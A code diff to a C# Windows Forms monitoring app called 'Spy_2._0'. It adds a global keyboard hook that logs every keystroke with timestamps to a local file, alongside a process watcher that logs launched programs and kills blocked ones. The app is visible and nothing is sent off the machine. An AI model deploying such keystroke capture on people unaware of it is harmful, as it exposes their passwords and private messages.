@@ -1,12 +1,12 @@
 using System;
-using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Linq;
 using System.Management;
 using System.Text;
 using System.Windows.Forms;
-using Newtonsoft.Json;
+using Spy_2._0.Hooks;
+using Spy_2._0.Models;
 
 namespace Spy_2._0.Forms
 {
@@ -14,12 +14,17 @@ namespace Spy_2._0.Forms
     {
         private AppSettings _settings;
         private ManagementEventWatcher _processStartWatcher;
+        private KeyboardHook _keyboardHook;
+
+        private Form _currentLogForm;
+        private TextBox _currentLogTextBox;
 
         public Form1()
         {
             InitializeComponent();
             LoadSettings();
             StartProcessWatcher();
+            StartKeyboardHook();
         }
 
         private void btnSave_Click(object sender, EventArgs e)
@@ -29,11 +34,7 @@ namespace Spy_2._0.Forms
             _settings.Moderation = chkModeration.Checked;
             _settings.ForbiddenWords = ForbiddenWords.Items.Cast<string>().ToList();
             _settings.ForbiddenPrograms = ForbiddenPrograms.Items.Cast<string>().ToList();
-
-            string filePath = Path.Combine(Application.StartupPath, "settings.json");
-            string json = JsonConvert.SerializeObject(_settings, Formatting.Indented);
-            File.WriteAllText(filePath, json);
-
+            _settings.Save();
             MessageBox.Show("Настройки сохранены!");
         }
 
@@ -67,39 +68,23 @@ namespace Spy_2._0.Forms
                 ForbiddenPrograms.Items.Remove(ForbiddenPrograms.SelectedItem);
         }
 
-        private void btnViewLog_Click(object sender, EventArgs e)
+        private void btnViewLog_Click(object sender, EventArgs e) => ShowFile("log.txt", "Log клавиш");
+
+        private void btnViewProcesses_Click(object sender, EventArgs e) => ShowFile("process_log.txt", "Log процессов");
+
+        private void btnViewJson_Click(object sender, EventArgs e)
         {
-            string path = _settings.ReportsPath;
-            if (string.IsNullOrWhiteSpace(path))
-                path = Path.Combine(Application.StartupPath, "Reports");
-
-            string filePath = Path.Combine(path, "log.txt");
-            ShowFileInForm(filePath, "Лог нажатий клавиш");
-        }
-
-        private void btnViewProcesses_Click(object sender, EventArgs e)
-        {
-            string path = _settings.ReportsPath;
-            if (string.IsNullOrWhiteSpace(path))
-                path = Path.Combine(Application.StartupPath, "Reports");
-
-            string filePath = Path.Combine(path, "process_log.txt");
-            ShowFileInForm(filePath, "Лог запущенных программ");
-        }
-
-        private void ShowFileInForm(string filePath, string title)
-        {
+            string filePath = Path.Combine(Application.StartupPath, "settings.json");
             if (!File.Exists(filePath))
             {
-                MessageBox.Show("Файл пуст или не найден: " + filePath);
+                MessageBox.Show("Файл settings.json не найден!");
                 return;
             }
 
-            string[] lines = File.ReadAllLines(filePath);
-
-            Form logForm = new Form
+            string json = File.ReadAllText(filePath);
+            Form jsonForm = new Form
             {
-                Text = title,
+                Text = "settings.json",
                 Size = new System.Drawing.Size(600, 400)
             };
 
@@ -108,33 +93,85 @@ namespace Spy_2._0.Forms
                 Multiline = true,
                 ReadOnly = true,
                 ScrollBars = ScrollBars.Vertical,
+                Dock = DockStyle.Fill,
+                Text = json
+            };
+
+            jsonForm.Controls.Add(box);
+            jsonForm.Show();
+        }
+
+        private void ShowFile(string fileName, string title)
+        {
+            string path = _settings.ReportsPath;
+            if (string.IsNullOrWhiteSpace(path))
+                path = Path.Combine(Application.StartupPath, "Reports");
+
+            string filePath = Path.Combine(path, fileName);
+            if (!File.Exists(filePath))
+            {
+                MessageBox.Show("Файл не знайдено: " + filePath);
+                return;
+            }
+
+            string[] lines = File.ReadAllLines(filePath);
+
+            if (_currentLogForm != null && !_currentLogForm.IsDisposed)
+            {
+                _currentLogTextBox.Clear();
+                foreach (string line in lines)
+                    _currentLogTextBox.AppendText(line + Environment.NewLine);
+                return;
+            }
+
+            _currentLogForm = new Form
+            {
+                Text = title,
+                Size = new System.Drawing.Size(600, 400)
+            };
+
+            _currentLogTextBox = new TextBox
+            {
+                Multiline = true,
+                ReadOnly = true,
+                ScrollBars = ScrollBars.Vertical,
                 Dock = DockStyle.Fill
             };
 
             foreach (string line in lines)
-                box.AppendText(line + Environment.NewLine);
+                _currentLogTextBox.AppendText(line + Environment.NewLine);
 
-            logForm.Controls.Add(box);
-            logForm.Show();
+            _currentLogForm.Controls.Add(_currentLogTextBox);
+            _currentLogForm.Show();
+        }
+
+        private void btnRefreshLog_Click(object sender, EventArgs e) => ShowFile("log.txt", "Log клавиш");
+
+        private void btnClearLog_Click(object sender, EventArgs e)
+        {
+            string filePath = Path.Combine(_settings.ReportsPath, "log.txt");
+            if (File.Exists(filePath))
+                File.WriteAllText(filePath, string.Empty);
+
+            if (_currentLogForm != null && !_currentLogForm.IsDisposed)
+                _currentLogTextBox.Clear();
+        }
+
+        private void btnRefreshProcessLog_Click(object sender, EventArgs e) => ShowFile("process_log.txt", "Log процесів");
+
+        private void btnClearProcessLog_Click(object sender, EventArgs e)
+        {
+            string filePath = Path.Combine(_settings.ReportsPath, "process_log.txt");
+            if (File.Exists(filePath))
+                File.WriteAllText(filePath, string.Empty);
+
+            if (_currentLogForm != null && !_currentLogForm.IsDisposed)
+                _currentLogTextBox.Clear();
         }
 
         private void LoadSettings()
         {
-            string filePath = Path.Combine(Application.StartupPath, "settings.json");
-            if (File.Exists(filePath))
-            {
-                string json = File.ReadAllText(filePath);
-                _settings = JsonConvert.DeserializeObject<AppSettings>(json);
-            }
-            else
-            {
-                _settings = new AppSettings
-                {
-                    ReportsPath = Path.Combine(Application.StartupPath, "Reports"),
-                    ForbiddenWords = new List<string>(),
-                    ForbiddenPrograms = new List<string>()
-                };
-            }
+            _settings = AppSettings.Load();
 
             txtPath.Text = _settings.ReportsPath;
             chkStatistics.Checked = _settings.Statistics;
@@ -160,7 +197,7 @@ namespace Spy_2._0.Forms
             }
             catch (Exception ex)
             {
-                MessageBox.Show("Ошибка запуска процесс-ватчера: " + ex.Message);
+                MessageBox.Show("Ошибка ProcessWatcher: " + ex.Message);
             }
         }
 
@@ -170,61 +207,50 @@ namespace Spy_2._0.Forms
             string processName = Path.GetFileNameWithoutExtension(processNameFull);
             DateTime startTime = DateTime.Now;
 
-            string path = _settings.ReportsPath;
-            if (string.IsNullOrWhiteSpace(path))
-                path = Path.Combine(Application.StartupPath, "Reports");
+            if (!Directory.Exists(_settings.ReportsPath))
+                Directory.CreateDirectory(_settings.ReportsPath);
 
-            if (!Directory.Exists(path))
-                Directory.CreateDirectory(path);
+            string filePath = Path.Combine(_settings.ReportsPath, "process_log.txt");
 
-            string filePath = Path.Combine(path, "process_log.txt");
+            string logLine = $"{startTime:yyyy-MM-dd HH:mm:ss} - {processNameFull}";
 
-            if (_settings.Moderation && _settings.ForbiddenPrograms != null)
+            if (_settings.Moderation && _settings.ForbiddenPrograms != null &&
+                _settings.ForbiddenPrograms.Any(f => string.Equals(f, processName, StringComparison.OrdinalIgnoreCase)))
             {
-                // проверяем без расширения
-                bool isForbidden = _settings.ForbiddenPrograms
-                    .Any(f => string.Equals(f, processName, StringComparison.OrdinalIgnoreCase));
-
-                if (isForbidden)
+                try
                 {
-                    try
-                    {
-                        foreach (var proc in Process.GetProcessesByName(processName))
-                        {
-                            proc.Kill();
-                        }
-                        string blockLine = $"{startTime:yyyy-MM-dd HH:mm:ss} - BLOCKED {processNameFull}{Environment.NewLine}";
-                        File.AppendAllText(filePath, blockLine, Encoding.UTF8);
-                        return;
-                    }
-                    catch (Exception ex)
-                    {
-                        string errorLine = $"{startTime:yyyy-MM-dd HH:mm:ss} - ERROR closing {processNameFull}: {ex.Message}{Environment.NewLine}";
-                        File.AppendAllText(filePath, errorLine, Encoding.UTF8);
-                        return;
-                    }
+                    foreach (var proc in Process.GetProcessesByName(processName))
+                        proc.Kill();
+                    logLine = $"{startTime:yyyy-MM-dd HH:mm:ss} - BLOCKED {processNameFull}";
+                }
+                catch (Exception ex)
+                {
+                    logLine = $"{startTime:yyyy-MM-dd HH:mm:ss} - ERROR closing {processNameFull}: {ex.Message}";
                 }
             }
 
-            string logLine = $"{startTime:yyyy-MM-dd HH:mm:ss} - {processNameFull}{Environment.NewLine}";
-            File.AppendAllText(filePath, logLine, Encoding.UTF8);
+            File.AppendAllText(filePath, logLine + Environment.NewLine, Encoding.UTF8);
         }
 
+        private void StartKeyboardHook()
+        {
+            _keyboardHook = new KeyboardHook();
+            _keyboardHook.KeyPressed += key =>
+            {
+                if (!Directory.Exists(_settings.ReportsPath))
+                    Directory.CreateDirectory(_settings.ReportsPath);
+
+                string filePath = Path.Combine(_settings.ReportsPath, "log.txt");
+                string line = $"{DateTime.Now:yyyy-MM-dd HH:mm:ss} - {key}";
+                File.AppendAllText(filePath, line + Environment.NewLine, Encoding.UTF8);
+            };
+        }
 
         protected override void OnFormClosing(FormClosingEventArgs e)
         {
             _processStartWatcher?.Stop();
             _processStartWatcher?.Dispose();
             base.OnFormClosing(e);
-        }
-
-        public class AppSettings
-        {
-            public string ReportsPath { get; set; }
-            public bool Statistics { get; set; }
-            public bool Moderation { get; set; }
-            public List<string> ForbiddenWords { get; set; }
-            public List<string> ForbiddenPrograms { get; set; }
         }
     }
 }
